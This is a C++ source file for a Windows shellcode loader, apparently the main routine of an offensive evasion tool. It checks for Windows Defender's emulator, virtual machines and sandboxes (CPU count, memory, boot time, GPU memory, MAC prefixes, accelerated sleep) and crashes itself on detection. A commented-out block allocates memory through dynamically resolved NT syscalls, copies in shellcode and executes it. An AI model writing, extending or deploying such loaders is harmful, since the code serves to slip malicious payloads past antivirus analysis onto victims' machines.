#include <iostream>
#include <Windows.h>
#include "Tools.h"
#include "Struct.h"
#include "ShellcodeExec.h"
#include "shellcode.h"
#include "PIGSyscall.hpp"
#include "definition.h"
#include "AntiVm.h"
#include "Function.hpp"

static auto& dynamicInvoker = DynamicInvoker::get_instance();


void test() {
	if (EnableAntiVM) {

		//wdIsEmulatorPresent2();
		
		query_license_value();
		BOOLEAN isVirtualMachine = FALSE;

		
		DebugPrintA("isVirtualMachine[+]: %d\n", isVirtualMachine);
		exit(1);
	}
}

// Hide Console
// int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
int main() {
	initAllFunc();

	test();

	// init function structure
	initAllFunc();

	if (AntiDefenderVM) {
		wdCheckEmulatedVFS();
		if (STATUS_NOT_SUPPORTED != wdIsEmulatorPresent()){ // is emulator
			memcpy(0, 0, 1); // exit
		}
		if (wdIsEmulatorPresent2()) {
			memcpy(0, 0, 1);
		}		
		if (wdIsEmulatorPresent3()) {
			memcpy(0, 0, 1);
		}
	}
	if (EnableAntiVM) {
		if (trick_DllGetClassObject) {
			if (checkDllGetClassObject()) {
				memcpy(0, 0, 1);
			}
		}
		if (trick_SxInDll) {
			if (checkSxInDll()) {
				memcpy(0, 0, 1);
			}
		}
		BOOLEAN isVirtualMachine = FALSE;

		isVirtualMachine = checkCPUCoreNum() | checkPhysicalMemory() | checkBootTime() | checkGPUMemory() |
			checkMacAddrPrefix() | accelerated_sleep();
		DebugPrintA("isVirtualMachine[+]: %d\n", isVirtualMachine);
		if (isVirtualMachine) {
			memcpy(0, 0, 1);
		}
	}
	/*
	ExecuteShellcodeStruct execStruct = { 0 };
	LPVOID lpMem = NULL;
	SIZE_T size = sizeof(shellcode);

	NTSTATUS status = dynamicInvoker.Invoke<NTSTATUS>(NtAllocateVirtualMemoryStruct.funcAddr, NtAllocateVirtualMemoryStruct.funcHash,
	(HANDLE)-1,
	&lpMem,
	0,
	&size,
	MEM_RESERVE | MEM_COMMIT,
	PAGE_READWRITE);
	DWORD	dwOldProtection = NULL;

	DebugPrintA("lpMem : %llx\n", lpMem);
	MEMORY_BASIC_INFORMATION mbi = { 0 };
	SIZE_T retSize = 0;
	dynamicInvoker.Invoke<NTSTATUS>(NtQueryVirtualMemoryStruct.funcAddr, NtQueryVirtualMemoryStruct.funcHash,
		(HANDLE)-1, lpMem, MemoryBasicInformation, &mbi, sizeof(MEMORY_BASIC_INFORMATION), &retSize);


	// =============================  EXECUTE =========================
	memcpy(lpMem, shellcode, sizeof(shellcode));
	execStruct.lpMem = lpMem;
	execStruct.memSize = sizeof(shellcode);
	ExecuteShellcode(&execStruct);
	// ============================ EXECUTE END =========================


	*/
}